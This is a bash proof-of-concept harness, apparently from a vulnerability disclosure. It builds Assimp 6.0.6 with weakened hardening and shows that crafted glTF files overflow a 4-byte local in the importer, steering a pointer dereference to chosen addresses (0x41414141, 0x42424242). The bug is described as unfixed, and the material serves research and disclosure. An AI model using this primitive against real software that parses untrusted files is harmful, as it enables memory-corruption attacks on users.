#!/usr/bin/env bash
# W10: file-steered pointer corruption in the real pinned glTF importer.
# A MAT4/FLOAT index accessor makes Indexer::GetValue<unsigned int>() memcpy
# 64 chosen bytes into a 4-byte local. In the plain -O1 frame those bytes also
# overwrite the live std::vector<std::unique_ptr<aiMesh>> used by CopyVector
# (glTFImporter.cpp:475); two documents differing in one chosen byte make the
# importer dereference two different chosen addresses. Author-measured,
# unwitnessed; no released fixed version, no r5.
set -euo pipefail
cd "$(dirname "$0")/.."

src=pins/assimp-6.0.6
bld=build-min-plain-nf
if [ ! -f "$bld/bin/libassimp.so.6.0.6" ]; then
    cmake -G Ninja -S "$src" -B "$bld" \
        -DCMAKE_BUILD_TYPE=Release \
        -DCMAKE_C_FLAGS='-O1 -g -U_FORTIFY_SOURCE -fno-omit-frame-pointer' \
        -DCMAKE_CXX_FLAGS='-O1 -g -U_FORTIFY_SOURCE -fno-omit-frame-pointer' \
        -DASSIMP_BUILD_ALL_IMPORTERS_BY_DEFAULT=OFF \
        -DASSIMP_BUILD_GLTF_IMPORTER=ON \
        -DASSIMP_BUILD_ALL_EXPORTERS_BY_DEFAULT=OFF \
        -DASSIMP_BUILD_ASSIMP_TOOLS=OFF \
        -DASSIMP_BUILD_TESTS=OFF \
        -DASSIMP_BUILD_SAMPLES=OFF \
        -DASSIMP_BUILD_ZLIB=ON \
        -DASSIMP_WARNINGS_AS_ERRORS=OFF >/dev/null
    cmake --build "$bld" --parallel 2 --target assimp >/dev/null
fi
mkdir -p w10/evidence harness/bin
g++ -O1 -g -DPLAIN_READ \
    -I "$src/include" -I "$bld/include" \
    harness/placement_driver.cpp -L "$bld/bin" -lassimp \
    -Wl,-rpath,"$PWD/$bld/bin" -o harness/bin/w10_plain_nf

rm -f w10/evidence/*.out w10/evidence/w10.trace
log=w10/evidence/w10.log
trace=w10/evidence/w10.trace
: >"$log"
: >"$trace"
pass=0
fail=0
check() { # name, file, required substring, rejected substring
    local name="$1" file="$2" need="${3-}" reject="${4-}"
    if [ -n "$need" ] && ! grep -qF "$need" "$file"; then
        printf 'FAIL %s (missing: %s)\n' "$name" "$need" | tee -a "$log"; fail=$((fail+1)); return
    fi
    if [ -n "$reject" ] && grep -qF "$reject" "$file"; then
        printf 'FAIL %s (found: %s)\n' "$name" "$reject" | tee -a "$log"; fail=$((fail+1)); return
    fi
    printf 'PASS %s\n' "$name" | tee -a "$log"; pass=$((pass+1))
}

run_direct() { # case, output
    local c="$1" out="$2" rc=0
    harness/bin/w10_plain_nf "harness/cases/$c.gltf" >"$out" 2>&1 || rc=$?
    printf '# case=%s rc=%s\n' "$c" "$rc" >>"$out"
    printf 'case=%s rc=%s\n' "$c" "$rc" >>"$trace"
    grep -E '^case=.*scene=' "$out" >>"$trace" || true
}

run_gdb() { # case, output
    local c="$1" out="$2"
    gdb -q -batch -x harness/w10_fault.gdb \
        --args harness/bin/w10_plain_nf "harness/cases/$c.gltf" >"$out" 2>&1 || true
    grep -F 'FAULT si_addr=' "$out" >>"$trace"
}

python3 - >w10/evidence/bytes.out <<'PY'
import base64, json, struct
for name in ("idxptr-zero", "idxptr-addr42", "idxptr-42", "idxptr-43"):
    with open("harness/cases/%s.gltf" % name) as f:
        uri = json.load(f)["buffers"]["buf"]["uri"]
    raw = base64.b64decode(uri.split(",", 1)[1])
    w0, w1 = struct.unpack("<II", raw[48:56])
    print("%s word0=%08x word1=%08x" % (name, w0, w1))
PY

run_direct safe w10/evidence/safe.out
check safe-scene-ok w10/evidence/safe.out 'scene=ok' 'Segmentation fault'

for c in idxptr-zero idxptr-addr42 idxptr-42 idxptr-43; do
    run_direct "$c" "w10/evidence/$c.out"
done
check zero-crash w10/evidence/idxptr-zero.out '# case=idxptr-zero rc=139'
check addr42-crash w10/evidence/idxptr-addr42.out '# case=idxptr-addr42 rc=139'
check ptr42-crash w10/evidence/idxptr-42.out '# case=idxptr-42 rc=139'
check ptr43-crash w10/evidence/idxptr-43.out '# case=idxptr-43 rc=139'

run_gdb idxptr-zero w10/evidence/gdb-zero.out
run_gdb idxptr-addr42 w10/evidence/gdb-addr42.out
check zero-fault-address w10/evidence/gdb-zero.out 'FAULT si_addr=0x41414141'
check addr42-fault-address w10/evidence/gdb-addr42.out 'FAULT si_addr=0x42424242'
check corrupted-vector-frame w10/evidence/gdb-zero.out 'CopyVector<aiMesh>'

check chosen-zero-bytes w10/evidence/bytes.out 'idxptr-zero word0=41414141 word1=00000000'
check chosen-addr42-bytes w10/evidence/bytes.out 'idxptr-addr42 word0=42424242 word1=00000000'

{
    printf '# W10 trace: claim-bearing lines only (no volatile addresses)\n'
} >w10/evidence/w10.trace.header
cat w10/evidence/w10.trace.header w10/evidence/w10.trace >w10/evidence/w10.trace.final
mv w10/evidence/w10.trace.final w10/evidence/w10.trace
rm -f w10/evidence/w10.trace.header

printf 'RESULT %s PASS / %s FAIL\n' "$pass" "$fail" | tee -a "$log"
printf 'RESULT %s PASS / %s FAIL\n' "$pass" "$fail" >>"$trace"
sha256sum w10/evidence/*.out w10/evidence/w10.trace | tee -a "$log"

cat >w10/evidence/W10-SUMMARY.md <<'EOF'
# W10 — file-steered pointer corruption in the real importer

Pinned Assimp v6.0.6, glTF 1.0 MAT4/FLOAT index accessor, count 1, on the
plain `-O1 -g -U_FORTIFY_SOURCE` library through `Importer::ReadFileFromMemory`.
`Accessor::Indexer::GetValue<unsigned int>()` copies 64 document-chosen bytes
into a 4-byte local (`glTFAsset.inl:474`); in this plain frame the copy also
overwrites the live `std::vector<std::unique_ptr<aiMesh>>` that
`ImportMeshes` passes to `CopyVector` at `glTFImporter.cpp:475`.

- `safe.gltf`: `scene=ok`, no fault.
- `idxptr-zero.gltf`: index-view bytes +12..+19 (document offsets 48..55)
  `0x41414141`, `0x00000000`;
  SIGSEGV, gdb `FAULT si_addr=0x41414141` in `CopyVector<aiMesh>`.
- `idxptr-addr42.gltf`: only the first chosen byte changes to `0x42424242`;
  SIGSEGV, gdb `FAULT si_addr=0x42424242` in the same frame. One crafted
  document byte steers the dereferenced address.
- `idxptr-42.gltf` / `idxptr-43.gltf`: non-canonical chosen addresses, rc 139.

The ASan build has a different frame layout (the 64-byte write reaches only
inlined `value` slots), so this pointer control is shown in the plain build
only. This is a chosen-address dereference, not a valid target object, not
control-flow redirection and not remote execution. No grooming, no listener,
no command, no r5. Author-measured, unwitnessed; both fix PRs remain unmerged.
EOF
printf 'W10-SUMMARY sha256: ' | tee -a "$log"
sha256sum w10/evidence/W10-SUMMARY.md | tee -a "$log"
[ "$fail" -eq 0 ]
